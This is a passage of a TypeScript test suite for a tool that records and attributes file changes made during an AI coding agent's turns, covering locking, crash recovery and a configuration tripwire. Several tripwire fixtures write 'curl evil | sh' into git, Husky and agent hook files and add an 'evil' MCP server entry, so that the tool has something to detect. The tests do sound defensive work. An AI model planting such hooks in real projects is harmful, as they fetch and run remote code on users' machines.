import { createHash } from 'node:crypto';
import { promises as fs, readFileSync, utimesSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { FileState, PathChange } from '../../../shared';
import type { ForeignDeltaRecord, OperationRecord } from '../../contracts';
import { collectGarbage, loadIndex } from '../store';
import { listWatched, MAX_WATCHED_TREE_FILES } from './config-watch';
import { LOCK_HELD_MESSAGE } from './lock';
import { PresenceChecker } from './presence';
import {
  BUSY_MESSAGE,
  CONFIG_PENDING_MESSAGE,
  PURGE_BUSY_MESSAGE,
  PURGE_CONFIG_PENDING_MESSAGE,
} from './tracker';
import {
  Turn,
  makeEnv,
  openWorkspace,
  operations,
  recordsOf,
  sha,
  sleep,
  until,
  type Env,
} from './test-support';

/** Tests for the review findings: each one asserts the behaviour the finding asked for. */

let env: Env;
beforeEach(async () => {
  env = await makeEnv();
});
afterEach(async () => {
  await env.cleanup();
});

async function started(
  files: Record<string, string> = {},
  options: Parameters<Env['tracker']>[0] = {},
) {
  await env.write({ 'seed.txt': 'seed', ...files });
  const tracker = env.tracker(options);
  const ws = await openWorkspace(tracker, env);
  await ws.sync(env.settings);
  const turn = new Turn(tracker, env);
  await turn.begin();
  return { tracker, ws, turn };
}

function changeOf(op: OperationRecord, path: string): PathChange {
  const found = op.changes.find((c) => c.path === path);
  if (!found) throw new Error(`no change for ${path}: ${op.changes.map((c) => c.path).join(', ')}`);
  return found;
}

function hashOf(state: FileState): string | undefined {
  return state.kind === 'file' ? state.hash : undefined;
}

async function textOf(
  ws: { blobs: { get(hash: string): Promise<Buffer> } },
  state: FileState,
): Promise<string> {
  const hash = hashOf(state);
  if (hash === undefined) throw new Error(`state has no hash: ${JSON.stringify(state)}`);
  return (await ws.blobs.get(hash)).toString();
}

function attributions(ws: Parameters<typeof operations>[0]): Record<string, string> {
  return Object.fromEntries(
    operations(ws).flatMap((o) => o.changes.map((c) => [c.path, c.attribution])),
  );
}

const journalPath = (): string => join(env.storage, env.folder.key, 'journal.json');

// ---------------------------------------------------------------------------------------------
describe('1. a file tool that never ran does not attribute', () => {
  it('a denied Edit, then a hand edit with no editor event: not agent-tool', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.fileTool('Edit', env.abs('a.ts'), () => Promise.resolve(), { outcome: 'denied' });
    await env.write({ 'a.ts': 'v1 written by the user in a terminal editor' });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'unattributed' });
  });

  it('a denied request keeps its capture in the store', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await env.write({ 'a.ts': 'user v1' }); // before the request: the capture sees this
    await turn.fileTool('Edit', env.abs('a.ts'), () => Promise.resolve(), { outcome: 'denied' });
    await env.write({ 'a.ts': 'user v2 and longer' });
    await turn.end();
    expect(await ws.blobs.has(sha('user v1'))).toBe(true);
    expect(attributions(ws)['a.ts']).toBe('unattributed');
  });

  it('a call that failed (post hook says failed) names nothing, even if the file changed', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.fileTool('Edit', env.abs('a.ts'), () => env.write({ 'a.ts': 'half written' }), {
      outcome: 'failed',
    });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'unattributed' });
  });

  it('a request that never completed (no post, no result) names nothing', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.fileTool('Edit', env.abs('a.ts'), () => env.write({ 'a.ts': 'v1' }), {
      withResult: false,
      withHooks: false,
    });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'unattributed' });
  });

  it('with no hooks, the tool result alone says whether it ran', async () => {
    const { ws, turn } = await started({ 'ok.ts': 'o', 'bad.ts': 'b', 'no.ts': 'n' });
    await turn.fileTool('Edit', env.abs('ok.ts'), () => env.write({ 'ok.ts': 'o2' }), {
      withHooks: false,
    });
    await turn.fileTool('Edit', env.abs('bad.ts'), () => env.write({ 'bad.ts': 'b2' }), {
      withHooks: false,
      outcome: 'failed',
    });
    await turn.fileTool('Edit', env.abs('no.ts'), () => env.write({ 'no.ts': 'n2' }), {
      withHooks: false,
      outcome: 'denied',
    });
    await turn.end();
    expect(attributions(ws)).toEqual({
      'ok.ts': 'agent-tool',
      'bad.ts': 'unattributed',
    });
  });

  it('a denied call followed by one that runs: only the second names the path', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.fileTool('Edit', env.abs('a.ts'), () => Promise.resolve(), { outcome: 'denied' });
    await turn.edit('a.ts', 'v1 by the agent');
    await turn.end();
    const change = changeOf(operations(ws)[0]!, 'a.ts');
    expect(change.attribution).toBe('agent-tool');
    expect(await textOf(ws, change.before)).toBe('v0');
  });
});

// ---------------------------------------------------------------------------------------------
describe('2. removals are exact', () => {
  it('(a) a case-only rename is a removal of the old name and a creation of the new one', async () => {
    const { ws, turn } = await started({ 'readme.md': 'content of the readme' });
    await turn.command(() => fs.rename(env.abs('readme.md'), env.abs('README.md')));
    await turn.end();
    const op = operations(ws)[0]!;
    const removed = changeOf(op, 'readme.md');
    const created = changeOf(op, 'README.md');
    expect(removed.after).toEqual({ kind: 'absent' });
    expect(removed.before).toMatchObject({ kind: 'file', stored: true });
    expect(await textOf(ws, removed.before)).toBe('content of the readme');
    expect(created.before).toEqual({ kind: 'absent' });
    expect(created.after).toMatchObject({ kind: 'file', stored: true });
    expect(await textOf(ws, created.after)).toBe('content of the readme');
    expect(op.changes).toHaveLength(2);
  });

  it('(a) the same through a restart: recovery logs both names', async () => {
    await env.write({ 'readme.md': 'content' });
    const first = env.tracker();
    const ws1 = await openWorkspace(first, env);
    await ws1.sync(env.settings);
    await first.dispose();
    await fs.rename(env.abs('readme.md'), env.abs('README.md'));
    await fs.writeFile(
      journalPath(),
      JSON.stringify({
        turnId: 't',
        conversationId: 'c',
        startedAt: 1,
        lastActivityAt: 1,
        pid: null,
      }),
    );
    const second = env.tracker({ isProcessAlive: () => false });
    await second.recover(env.folder, env.settings);
    const op = operations(second.folder(env.folder.key)!)[0]!;
    expect(changeOf(op, 'readme.md').after).toEqual({ kind: 'absent' });
    expect(changeOf(op, 'README.md').before).toEqual({ kind: 'absent' });
  });

  it('(b) a file replaced by a directory logs the removal and the creations inside', async () => {
    const { ws, turn } = await started({ notes: 'precious user content' });
    await turn.command(async () => {
      await fs.rm(env.abs('notes'));
      await fs.mkdir(env.abs('notes'));
      await fs.writeFile(env.abs('notes/readme.md'), 'x');
    });
    await turn.end();
    const op = operations(ws)[0]!;
    expect(op.changes.map((c) => c.path).sort()).toEqual(['notes', 'notes/readme.md']);
    const removed = changeOf(op, 'notes');
    expect(removed.after).toEqual({ kind: 'absent' });
    expect(hashOf(removed.before)).toBe(sha('precious user content'));
    expect(await textOf(ws, removed.before)).toBe('precious user content');
  });

  it('(b) between turns: a foreign delta records the removal of a file that has history', async () => {
    await env.write({ notes: 'v0' });
    const tracker = env.tracker();
    const ws = await openWorkspace(tracker, env);
    await ws.sync(env.settings);
    const turn = new Turn(tracker, env);
    await turn.begin();
    await turn.edit('notes', 'v1');
    await turn.end();
    await fs.rm(env.abs('notes'));
    await fs.mkdir(env.abs('notes'));
    await env.write({ 'notes/inside.txt': 'i' });
    await ws.sync(env.settings);
    const delta = recordsOf(ws)[1] as ForeignDeltaRecord;
    expect(delta.type).toBe('foreign-delta');
    expect(delta.changes).toHaveLength(1);
    expect(delta.changes[0]?.path).toBe('notes');
    expect(delta.changes[0]?.after).toEqual({ kind: 'absent' });
  });

  it('(c) a turn that edits a file and adds it to .gitignore logs both changes', async () => {
    const { ws, turn } = await started({ 'config.local.json': '{"a":1}', '.gitignore': 'dist\n' });
    await turn.edit('.gitignore', 'dist\nconfig.local.json\n');
    await turn.edit('config.local.json', '{"a":2}');
    await turn.end();
    const op = operations(ws)[0]!;
    expect(op.changes.map((c) => c.path).sort()).toEqual(['.gitignore', 'config.local.json']);
    const change = changeOf(op, 'config.local.json');
    expect(await textOf(ws, change.before)).toBe('{"a":1}');
    expect(await textOf(ws, change.after)).toBe('{"a":2}');
    expect(change.attribution).toBe('agent-tool');
  });

  it('PresenceChecker: exact names, kinds and missing parents', async () => {
    await env.write({ 'dir/File.txt': 'x', plain: 'p' });
    await fs.mkdir(env.abs('adir'));
    if (process.platform !== 'win32') await fs.symlink('plain', env.abs('link'));
    const presence = new PresenceChecker(env.root);
    expect(await presence.isPresent('dir/File.txt')).toBe(true);
    expect(await presence.isPresent('dir/file.txt')).toBe(false); // not byte for byte
    expect(await presence.isPresent('adir')).toBe(false); // a directory is not that file
    expect(await presence.isPresent('missing/deeper.txt')).toBe(false);
    expect(await presence.isPresent('plain')).toBe(true);
    if (process.platform !== 'win32') expect(await presence.isPresent('link')).toBe(true);
  });
});

// ---------------------------------------------------------------------------------------------
describe('3. the user’s content captured before an agent overwrite is kept by a record', () => {
  function expectChain(
    ws: Parameters<typeof operations>[0],
    path: string,
  ): { delta: ForeignDeltaRecord; op: OperationRecord } {
    const records = recordsOf(ws);
    expect(records.map((r) => r.type)).toEqual(['foreign-delta', 'operation']);
    const delta = records[0] as ForeignDeltaRecord;
    const op = records[1] as OperationRecord;
    expect(delta.changes.map((c) => c.path)).toEqual([path]);
    return { delta, op };
  }

  it('after an editor save: foreign delta (B to the user’s file), then an agent-tool change from it', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R original' });
    await turn.userSave('a.ts', 'U user work');
    await turn.edit('a.ts', 'A agent');
    await turn.end();
    const { delta, op } = expectChain(ws, 'a.ts');
    expect(await textOf(ws, delta.changes[0]!.before)).toBe('R original');
    expect(await textOf(ws, delta.changes[0]!.after)).toBe('U user work');
    const change = changeOf(op, 'a.ts');
    expect(await textOf(ws, change.before)).toBe('U user work');
    expect(await textOf(ws, change.after)).toBe('A agent');
    expect(change.before).toMatchObject({ stored: true });
    expect(change.attribution).toBe('agent-tool');
  });

  it('with no editor event at all', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R original' });
    await env.write({ 'a.ts': 'U user work, outside the editor' });
    await turn.edit('a.ts', 'A agent');
    await turn.end();
    const { delta, op } = expectChain(ws, 'a.ts');
    expect(await textOf(ws, delta.changes[0]!.after)).toBe('U user work, outside the editor');
    expect(changeOf(op, 'a.ts').attribution).toBe('agent-tool');
    expect(await textOf(ws, changeOf(op, 'a.ts').before)).toBe('U user work, outside the editor');
  });

  it('inside a Task window', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.hook('pre', 'Task', { prompt: 'refactor' }, 'toolu_task');
    await env.write({ 'a.ts': 'v1 user work' });
    await turn.edit('a.ts', 'v2 agent');
    await turn.hook('post', 'Task', { prompt: 'refactor' }, 'toolu_task');
    turn.result('toolu_task', true);
    await turn.end();
    const { delta, op } = expectChain(ws, 'a.ts');
    expect(await textOf(ws, delta.changes[0]!.after)).toBe('v1 user work');
    const change = changeOf(op, 'a.ts');
    expect(await textOf(ws, change.before)).toBe('v1 user work');
    expect(change.attribution).toBe('agent-tool');
  });

  it('all mid-turn foreign deltas of a turn are one record, just before the operation', async () => {
    const { ws, turn } = await started({ 'a.ts': 'a0', 'b.ts': 'b0', 'c.ts': 'c0' });
    await env.write({ 'a.ts': 'a-user', 'b.ts': 'b-user' });
    await turn.edit('a.ts', 'a-agent');
    await turn.edit('b.ts', 'b-agent');
    await turn.edit('c.ts', 'c-agent'); // untouched by the user: no foreign change
    await turn.end();
    const records = recordsOf(ws);
    expect(records.map((r) => r.type)).toEqual(['foreign-delta', 'operation']);
    expect((records[0] as ForeignDeltaRecord).changes.map((c) => c.path)).toEqual(['a.ts', 'b.ts']);
    expect((records[1] as OperationRecord).changes).toHaveLength(3);
  });

  it('a user save after the capture and before the write is mixed', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.fileTool('Edit', env.abs('a.ts'), async () => {
      await turn.userSave('a.ts', 'user saved while the tool was working');
      await env.write({ 'a.ts': 'agent text' });
    });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'mixed' });
  });

  it('records the foreign change even when the agent writes the original back', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await env.write({ 'a.ts': 'U' });
    await turn.edit('a.ts', 'R');
    await turn.end();
    const records = recordsOf(ws);
    expect(records.map((r) => r.type)).toEqual(['foreign-delta', 'operation']);
    const change = changeOf(records[1] as OperationRecord, 'a.ts');
    expect(await textOf(ws, change.before)).toBe('U');
    expect(await textOf(ws, change.after)).toBe('R');
  });
});

// ---------------------------------------------------------------------------------------------
describe('4. tool windows', () => {
  it('a. in a file tool’s window, another path that changed is a gap change, not a command change', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0', 'mine.ts': 'm0' });
    await turn.fileTool('Edit', env.abs('a.ts'), async () => {
      await env.write({ 'mine.ts': 'm1 user work' });
      await env.write({ 'a.ts': 'v1' });
    });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'agent-tool', 'mine.ts': 'unattributed' });
  });

  it('b. a command that was denied does not leave a window open', async () => {
    const { ws, turn } = await started({ 'mine.ts': 'm0', 'b.ts': 'b0' });
    await turn.hook('pre', 'Bash', { command: 'rm -rf build' }, 'toolu_denied');
    turn.result('toolu_denied', false);
    await env.write({ 'mine.ts': 'm1 user work' }); // no tool is running now
    await turn.command(() => Promise.resolve());
    await turn.end();
    expect(attributions(ws)).toEqual({ 'mine.ts': 'unattributed' });
  });

  it('b. a pre hook closed only by its tool result still closes the window, and scans it', async () => {
    const { ws, turn } = await started();
    await turn.hook('pre', 'Bash', { command: 'make' }, 'toolu_x'); // the post hook never comes
    await env.write({ 'made.txt': 'by the command' });
    turn.result('toolu_x', true);
    // The result closes the window with a scan queued on the folder; let it run before the next
    // write, as the time between a tool's end and the next event does in a real turn.
    await ws.exclusive(() => Promise.resolve());
    await env.write({ 'later.txt': 'someone else, after' });
    await turn.command(() => Promise.resolve());
    await turn.end();
    expect(attributions(ws)).toEqual({ 'made.txt': 'agent-command', 'later.txt': 'unattributed' });
  });

  it('b. gap detection, and the late check, keep working after an unanswered call', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0', 'g.ts': 'g0' });
    await turn.hook('pre', 'Bash', {}, 'toolu_denied');
    turn.result('toolu_denied', false);
    await env.write({ 'g.ts': 'g1' }); // between tools
    await turn.edit('a.ts', 'v1');
    await env.write({ 'a.ts': 'v2 someone else, after the last tool' });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'a.ts': 'mixed', 'g.ts': 'unattributed' });
  });

  it('b. a command cut off with no post hook and no result leaves its changes unattributed', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.hook('pre', 'Bash', { command: 'codemod' }, 'toolu_x');
    await env.write({ 'a.ts': 'v1 by the command' });
    await turn.end('interrupted');
    expect(attributions(ws)).toEqual({ 'a.ts': 'unattributed' });
  });

  it('c. a save alone is user only when the file ended as it was saved', async () => {
    const { ws, turn } = await started({ 'x.ts': 'x0', 'y.ts': 'y0' });
    await turn.userSave('x.ts', 'x1 user');
    await turn.userSave('y.ts', 'y1 user');
    await env.write({ 'y.ts': 'y2 changed again, outside the editor' });
    await turn.end();
    expect(attributions(ws)).toEqual({ 'x.ts': 'user', 'y.ts': 'mixed' });
  });

  it('c. a save, then a background process rewrites the file between tools: mixed', async () => {
    const { ws, turn } = await started({ 'x.ts': 'x0' });
    await turn.command(() => Promise.resolve()); // `build --watch &` returns at once
    await turn.userSave('x.ts', 'x1 user');
    await env.write({ 'x.ts': 'x2 written by the background process' });
    await turn.command(() => Promise.resolve());
    await turn.end();
    expect(attributions(ws)).toEqual({ 'x.ts': 'mixed' });
  });

  it('c. a save, then a command that is cut off rewrites the file: mixed', async () => {
    const { ws, turn } = await started({ 'x.ts': 'x0' });
    await turn.userSave('x.ts', 'x1 user');
    await turn.hook('pre', 'Bash', { command: 'sed -i ... x.ts' }, 'toolu_cut');
    await env.write({ 'x.ts': 'x2 agent command' });
    await turn.end('interrupted');
    expect(attributions(ws)).toEqual({ 'x.ts': 'mixed' });
  });
});

// ---------------------------------------------------------------------------------------------
describe('5. paths the log cannot represent', () => {
  it('are left out with a note and a warning; the rest of the turn is recorded', async () => {
    const { ws, turn } = await started({ 'a.ts': 'v0' });
    await turn.edit('a.ts', 'v1-agent');
    await turn.shellWrite({ 'c:out.log': 'a script with a Windows path', 'd:x.log': 'x' });
    const notices = await turn.end();
    const op = operations(ws)[0]!;
    expect(op.changes.map((c) => c.path)).toEqual(['a.ts']);
    const text = '2 changed paths have names AgentCanopy cannot track: c:out.log, d:x.log.';
    expect(notices.find((n) => n.text.includes('cannot track'))).toEqual({
      level: 'warning',
      text,
    });
    expect(op.notes).toContain(text);
    expect(ws.busy()).toBe(false);
  });

  it('names at most three and counts the rest', async () => {
    const { ws, turn } = await started();
    await turn.shellWrite({
      'a:1': '1',
      'b:2': '2',
      'c:3': '3',
      'd:4': '4',
      'e:5': '5',
      'ok.txt': 'fine',
    });
    const notices = await turn.end();
    expect(notices.find((n) => n.text.includes('cannot track'))?.text).toBe(
      '5 changed paths have names AgentCanopy cannot track: a:1, b:2, c:3 and 2 more.',
    );
    expect(operations(ws)[0]!.changes.map((c) => c.path)).toEqual(['ok.txt']);
  });

  it('recovery copes with such a path instead of failing on it every time', async () => {
    await env.write({ 'a.ts': 'v0' });
    const first = env.tracker();
    const turn = new Turn(first, env);
    await turn.begin();
    await turn.shellWrite({ 'c:out.log': 'x', 'fine.txt': 'y' });
    await first.dispose();
    const second = env.tracker({ isProcessAlive: () => false });
    const result = await second.recover(env.folder, env.settings);
    expect(result.recovered).toBe(true);
    expect(
      result.notes.some((n) =>
        n.includes('1 changed path has a name AgentCanopy cannot track: c:out.log'),
      ),
    ).toBe(true);
    const ws = second.folder(env.folder.key)!;
    expect(ws.busy()).toBe(false);
    expect(operations(ws)[0]!.changes.map((c) => c.path)).toEqual(['fine.txt']);
    await expect(fs.access(journalPath())).rejects.toThrow();
  });

  it('when the turn cannot be recorded at all the journal stays and the folder stays busy', async () => {
    const { ws, turn, tracker } = await started({ 'a.ts': 'v0' }, { isProcessAlive: () => false });
    await turn.edit('a.ts', 'v1');
    const logFile = join(env.storage, env.folder.key, 'log.jsonl');
    await fs.rm(logFile, { force: true });
    await fs.mkdir(logFile);
    const notices = await turn.end();
    expect(notices.map((n) => n.level)).toEqual(['error']);
    expect(ws.busy()).toBe(true);
    await fs.access(journalPath());
    await fs.rm(logFile, { recursive: true });
    await expect(tracker.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: true,
    });
    expect(ws.busy()).toBe(false);
  });
});

// ---------------------------------------------------------------------------------------------
describe('6. orphans', () => {
  async function readJournal(): Promise<{ pid: number | null; processStart?: string }> {
    return JSON.parse(await fs.readFile(journalPath(), 'utf8')) as {
      pid: number | null;
      processStart?: string;
    };
  }

  it('the pid and its start time reach the journal in one write', async () => {
    const tracker = env.tracker({
      processStartTime: async () => {
        await sleep(150);
        return 'Mon Nov 10 10:00:00 2026';
      },
    });
    await openWorkspace(tracker, env);
    const turn = new Turn(tracker, env);
    await turn.begin();
    tracker.observer.onProcessStarted?.(turn.ctx, 4321);
    const seen: { pid: number | null; processStart?: string }[] = [];
    for (let i = 0; i < 60; i += 1) {
      seen.push(await readJournal());
      if (seen.at(-1)?.pid === 4321) break;
      await sleep(10);
    }
    expect(seen.at(-1)).toMatchObject({ pid: 4321, processStart: 'Mon Nov 10 10:00:00 2026' });
    expect(seen.every((j) => j.pid === null || j.processStart !== undefined)).toBe(true);
    await turn.end();
  });

  it('when the start time cannot be read the pid is written alone', async () => {
    const tracker = env.tracker({ processStartTime: () => Promise.reject(new Error('no ps')) });
    await openWorkspace(tracker, env);
    const turn = new Turn(tracker, env);
    await turn.begin();
    tracker.observer.onProcessStarted?.(turn.ctx, 4321);
    await until(() => {
      try {
        return (
          (JSON.parse(readFileSync(journalPath(), 'utf8')) as { pid: number | null }).pid === 4321
        );
      } catch {
        return false;
      }
    });
    const journal = await readJournal();
    expect(journal.pid).toBe(4321);
    expect(journal.processStart).toBeUndefined();
    await turn.end();
  });

  it('a pid recorded just before the host goes away is not lost', async () => {
    const tracker = env.tracker({ processStartTime: () => Promise.resolve('S') });
    await openWorkspace(tracker, env);
    const turn = new Turn(tracker, env);
    await turn.begin();
    tracker.observer.onProcessStarted?.(turn.ctx, 4321);
    await tracker.dispose();
    expect(await readJournal()).toMatchObject({ pid: 4321, processStart: 'S' });
  });

  async function crashedWithPid(journal: Record<string, unknown>): Promise<void> {
    await env.write({ 'a.txt': 'a' });
    const first = env.tracker();
    const ws = await openWorkspace(first, env);
    await ws.sync(env.settings);
    await first.dispose();
    await env.write({ 'a.txt': 'changed while the old process ran' });
    await fs.writeFile(
      journalPath(),
      JSON.stringify({
        turnId: 'turn-dead',
        conversationId: 'conv-1',
        startedAt: 1,
        lastActivityAt: Date.now(),
        pid: 4242,
        ...journal,
      }),
    );
  }

  it('a live pid with no recorded start time: not recovered, folder busy, until forced', async () => {
    await crashedWithPid({});
    const tracker = env.tracker({
      isProcessAlive: (pid) => pid === 4242,
      processStartTime: () => Promise.resolve('S'),
    });
    const note =
      'Claude Code from an interrupted turn may still be running (process 4242). Stop it, then choose Recover now.';
    expect(await tracker.recover(env.folder, env.settings)).toEqual({
      recovered: false,
      notes: [note],
    });
    const ws = tracker.folder(env.folder.key)!;
    expect(ws.busy()).toBe(true);
    await expect(new Turn(tracker, env).begin()).rejects.toThrow(BUSY_MESSAGE);
    // May be asked again at any time.
    expect(await tracker.recover(env.folder, env.settings)).toEqual({
      recovered: false,
      notes: [note],
    });

    const forced = await tracker.recover(env.folder, env.settings, { force: true });
    expect(forced.recovered).toBe(true);
    expect(ws.busy()).toBe(false);
    expect(operations(ws)).toHaveLength(1);
  });

  it('a live pid whose start time cannot be read now: not recovered', async () => {
    await crashedWithPid({ processStart: 'S' });
    const tracker = env.tracker({
      isProcessAlive: (pid) => pid === 4242,
      processStartTime: () => Promise.resolve(undefined),
    });
    const result = await tracker.recover(env.folder, env.settings);
    expect(result.recovered).toBe(false);
    expect(result.notes[0]).toContain('may still be running (process 4242)');
  });

  it('force skips the liveness check even when the process is known to be running', async () => {
    await crashedWithPid({ processStart: 'S' });
    const tracker = env.tracker({
      isProcessAlive: (pid) => pid === 4242,
      processStartTime: () => Promise.resolve('S'),
    });
    expect((await tracker.recover(env.folder, env.settings)).recovered).toBe(false);
    expect((await tracker.recover(env.folder, env.settings, { force: true })).recovered).toBe(true);
  });
});

// ---------------------------------------------------------------------------------------------
describe('7. locking', () => {
  function lockDirEnv() {
    const lockDir = join(env.base, 'locks');
    return { lockDir, other: { storageDir: join(env.base, 'storage-2') } };
  }

  it('a. with lockDir, windows with different storage contend for the same lock', async () => {
    const { lockDir, other } = lockDirEnv();
    const first = env.tracker({ lockDir });
    await openWorkspace(first, env);
    const second = env.tracker({ lockDir, ...other });
    await expect(second.recover(env.folder, env.settings)).rejects.toThrow(LOCK_HELD_MESSAGE);
    const name = `${createHash('sha256')
      .update(await fs.realpath(env.root))
      .digest('hex')
      .slice(0, 32)}.lock`;
    expect(await fs.readdir(lockDir)).toEqual([name]);
    await first.dispose();
    expect(await fs.readdir(lockDir)).toEqual([]);
    await expect(second.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: false,
    });
  });

  it('a. without lockDir, two storage directories do not contend (the old behaviour)', async () => {
    const { other } = lockDirEnv();
    const first = env.tracker();
    await openWorkspace(first, env);
    const second = env.tracker(other);
    await expect(second.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: false,
    });
  });

  async function foreignLock(lockDir: string, content: Record<string, unknown>, ageMs = 0) {
    await fs.mkdir(lockDir, { recursive: true });
    const name = `${createHash('sha256')
      .update(await fs.realpath(env.root))
      .digest('hex')
      .slice(0, 32)}.lock`;
    const file = join(lockDir, name);
    await fs.writeFile(file, JSON.stringify({ startedAt: 1, owner: 'someone-else', ...content }));
    const when = new Date(Date.now() - ageMs);
    await fs.utimes(file, when, when);
    return file;
  }

  it('b. a live pid with a lock nobody refreshes is stale', async () => {
    const { lockDir } = lockDirEnv();
    await foreignLock(lockDir, { pid: 4242 }, 10 * 60_000);
    const tracker = env.tracker({
      lockDir,
      isProcessAlive: (pid) => pid === 4242,
      lockStaleMs: 90_000,
    });
    await expect(tracker.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: false,
    });
  });

  it('b. a live pid with a fresh lock holds it; once the heartbeat stops it goes stale', async () => {
    const { lockDir } = lockDirEnv();
    const file = await foreignLock(lockDir, { pid: 4242 });
    const heartbeat = setInterval(() => {
      const now = new Date();
      try {
        utimesSync(file, now, now);
      } catch {
        /* the lock was taken over */
      }
    }, 30);
    const tracker = env.tracker({
      lockDir,
      isProcessAlive: (pid) => pid === 4242,
      lockStaleMs: 150,
    });
    try {
      await sleep(400);
      await expect(tracker.recover(env.folder, env.settings)).rejects.toThrow(LOCK_HELD_MESSAGE);
    } finally {
      clearInterval(heartbeat);
    }
    await sleep(250);
    await expect(tracker.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: false,
    });
  });

  it('b. the owner refreshes the lock’s mtime on a timer', async () => {
    const { lockDir } = lockDirEnv();
    const tracker = env.tracker({ lockDir, lockHeartbeatMs: 30, lockStaleMs: 5000 });
    await openWorkspace(tracker, env);
    const [name] = await fs.readdir(lockDir);
    const before = (await fs.stat(join(lockDir, name!))).mtimeMs;
    await sleep(200);
    expect((await fs.stat(join(lockDir, name!))).mtimeMs).toBeGreaterThan(before);
  });

  it('b. a dead pid is stale at once', async () => {
    const { lockDir } = lockDirEnv();
    await foreignLock(lockDir, { pid: 4242 });
    const tracker = env.tracker({ lockDir, isProcessAlive: () => false });
    await expect(tracker.recover(env.folder, env.settings)).resolves.toMatchObject({
      recovered: false,
    });
  });

  it('c. two hosts taking over the same stale lock: exactly one wins', async () => {
    const { lockDir, other } = lockDirEnv();
    await foreignLock(lockDir, { pid: 4242 }, 10 * 60_000);
    const a = env.tracker({ lockDir, isProcessAlive: () => false });
    const b = env.tracker({ lockDir, isProcessAlive: () => false, ...other });
    const results = await Promise.allSettled([
      a.recover(env.folder, env.settings),
      b.recover(env.folder, env.settings),
    ]);
    expect(results.filter((r) => r.status === 'fulfilled')).toHaveLength(1);
    const lost = results.find((r) => r.status === 'rejected') as PromiseRejectedResult;
    expect((lost.reason as Error).message).toBe(LOCK_HELD_MESSAGE);
    expect(await fs.readdir(lockDir)).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------------------------
describe('8. configuration tripwire', () => {
  const posix = process.platform !== 'win32';

  async function setup(files: Record<string, string> = {}, makeGit = false) {
    if (makeGit) {
      await fs.mkdir(env.abs('.git/hooks'), { recursive: true });
      await env.write({ '.git/HEAD': 'ref: refs/heads/main\n' });
    }
    await env.write({ 'a.txt': 'a', ...files });
    const tracker = env.tracker();
    await openWorkspace(tracker, env);
    const turn = new Turn(tracker, env);
    await turn.begin();
    return { tracker, turn };
  }

  it.skipIf(!posix)(
    'a. a file that could not be read at turn start is never "created" or revertible',
    async () => {
      await env.write({ '.mcp.json': '{"servers":{}}' });
      await fs.chmod(env.abs('.mcp.json'), 0o000);
      const { tracker, turn } = await setup();
      await turn.command(async () => {
        await fs.chmod(env.abs('.mcp.json'), 0o644);
        await fs.writeFile(env.abs('.mcp.json'), '{"servers":{"evil":{}}}');
      });
      const notices = await turn.end();
      expect(tracker.configChanges(env.folder.key)).toEqual([]);
      expect(notices.filter((n) => n.text.includes('configuration'))).toEqual([]);
    },
  );

  it('b. a repository created during the turn: its hooks and config are created files', async () => {
    const { tracker, turn } = await setup();
    await turn.command(async () => {
      await fs.mkdir(env.abs('.git/hooks'), { recursive: true });
      await env.write({
        '.git/HEAD': 'ref: refs/heads/main\n',
        '.git/config': '[core]\n',
        '.git/hooks/pre-commit': '#!/bin/sh\ncurl evil | sh\n',
        '.git/hooks/pre-push.sample': '#!/bin/sh\n',
      });
    });
    const notices = await turn.end();
    const changes = tracker.configChanges(env.folder.key);
    expect(changes.map((c) => c.displayPath).sort()).toEqual([
      '.git/config',
      '.git/hooks/pre-commit',
    ]);
    expect(changes.every((c) => c.changeType === 'created' && c.revertible)).toBe(true);
    expect(
      notices.some((n) => n.text.startsWith('This turn changed tool or editor configuration')),
    ).toBe(true);
    await expect(new Turn(tracker, env).begin()).rejects.toThrow(CONFIG_PENDING_MESSAGE);
  });

  it('c. skills, hooks, commands, agents, .husky and .vscode/mcp.json are watched', async () => {
    const { tracker, turn } = await setup(
      {
        '.husky/pre-commit': 'npm test\n',
        '.claude/hooks/check.sh': 'true\n',
        '.claude/agents/old.md': 'old agent\n',
      },
      true,
    );
    await turn.command(async () => {
      await env.write({
        '.claude/skills/x/SKILL.md': '---\nallowed-tools: Bash\n---\n', // new, in a subdirectory
        '.claude/hooks/check.sh': 'curl evil | sh\n', // changed
        '.husky/pre-commit': 'curl evil | sh\n', // changed
        '.vscode/mcp.json': '{"servers":{"x":{"command":"sh"}}}', // new
        '.claude/commands/go.md': '---\nallowed-tools: Bash\n---\n', // new
      });
      await fs.rm(env.abs('.claude/agents/old.md')); // removed
    });
    await turn.end();
    const byPath = new Map(
      tracker.configChanges(env.folder.key).map((c) => [c.displayPath, c.changeType]),
    );
    expect(Object.fromEntries(byPath)).toEqual({
      '.claude/skills/x/SKILL.md': 'created',
      '.claude/hooks/check.sh': 'modified',
      '.husky/pre-commit': 'modified',
      '.vscode/mcp.json': 'created',
      '.claude/commands/go.md': 'created',
      '.claude/agents/old.md': 'deleted',
    });
  });

  it('c. at the git root above the folder too', async () => {
    const sub = await makeEnv({ folderSubdir: 'repo/packages/app' });
    try {
